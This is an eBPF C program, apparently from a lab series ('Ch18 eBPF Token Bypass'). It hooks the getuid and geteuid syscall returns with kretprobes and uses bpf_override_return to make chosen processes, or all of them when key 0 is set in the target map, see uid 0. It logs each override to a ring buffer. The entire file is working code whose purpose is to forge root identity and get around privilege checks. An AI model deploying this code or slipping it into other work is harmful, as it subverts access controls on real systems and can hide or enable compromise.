// Ch18 eBPF Token Bypass — forge uid to 0 by overriding getuid/geteuid
// syscall returns for target tgids. __arm64_sys_{get,gete}uid are in the
// error_injection allowlist so bpf_override_return works.
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

char LICENSE[] SEC("license") = "GPL";

struct evt {
    unsigned int pid;
    unsigned int tgid;
    char comm[16];
    long orig_ret;
    int syscall_id;   // 0=getuid 1=geteuid
    int flipped;
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 18);
} events SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, unsigned int);
    __type(value, unsigned int);
    __uint(max_entries, 1024);
} target_tgids SEC(".maps");

static __always_inline int is_target(void)
{
    unsigned int tgid = bpf_get_current_pid_tgid() >> 32;
    if (bpf_map_lookup_elem(&target_tgids, &tgid)) return 1;
    unsigned int zero = 0;
    if (bpf_map_lookup_elem(&target_tgids, &zero)) return 1;
    return 0;
}

static __always_inline void emit(long ret, int sid, int flipped)
{
    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return;
    unsigned long id = bpf_get_current_pid_tgid();
    e->pid = id & 0xffffffff;
    e->tgid = id >> 32;
    bpf_get_current_comm(&e->comm, sizeof(e->comm));
    e->orig_ret = ret;
    e->syscall_id = sid;
    e->flipped = flipped;
    bpf_ringbuf_submit(e, 0);
}

// NOTE: arch-specific symbol. On x86_64 use __x64_sys_getuid.
// The loader should select the correct symbol at runtime based on uname -m.
SEC("kretprobe/__arm64_sys_getuid")
int BPF_KRETPROBE(kr_getuid, long ret)
{
    int flip = 0;
    if (is_target() && ret != 0) {
        bpf_override_return(ctx, 0);
        flip = 1;
    }
    emit(ret, 0, flip);
    return 0;
}

// NOTE: arch-specific symbol. On x86_64 use __x64_sys_geteuid.
SEC("kretprobe/__arm64_sys_geteuid")
int BPF_KRETPROBE(kr_geteuid, long ret)
{
    int flip = 0;
    if (is_target() && ret != 0) {
        bpf_override_return(ctx, 0);
        flip = 1;
    }
    emit(ret, 1, flip);
    return 0;
}
